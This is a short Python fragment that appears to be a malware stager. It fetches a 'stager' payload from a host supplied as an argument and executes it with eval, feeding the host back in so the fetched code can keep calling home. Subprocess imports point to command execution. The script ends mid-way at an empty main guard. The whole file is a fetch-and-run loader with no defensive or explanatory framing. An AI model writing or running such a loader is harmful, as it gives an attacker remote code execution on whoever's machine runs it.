import requests; from time import sleep; from subprocess import Popen, PIPE; import os
def main(argv=None):
	payload = requests.get(argv[1]+"/stager").content.decode()
	payload += "\tmain(argv=['','%s'])" % argv[1]
	eval(payload)
if __name__ == "__main__":
